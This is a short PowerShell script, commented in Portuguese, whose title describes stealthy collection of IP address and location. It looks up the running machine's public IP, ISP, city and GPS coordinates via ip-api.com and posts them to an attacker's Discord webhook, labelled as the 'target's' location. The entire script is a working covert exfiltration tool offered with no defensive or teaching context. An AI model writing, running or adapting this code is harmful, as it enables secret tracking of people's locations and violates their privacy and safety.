# Coleta de IP e Localização Furtiva
$webhook = "SUA_URL_DO_WEBHOOK"
$info = Invoke-RestMethod -Uri "http://ip-api.com"

$msg = @{
    content = "📍 **Localização do Alvo Detectada:**`n" +
              "🌐 **IP:** $($info.query)`n" +
              "🏢 **Provedor:** $($info.isp)`n" +
              "📍 **Cidade:** $($info.city) / $($info.regionName)`n" +
              "🌎 **Coordenadas:** $($info.lat), $($info.lon)"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
Write-Host "Localização enviada ao Discord!" -ForegroundColor Green
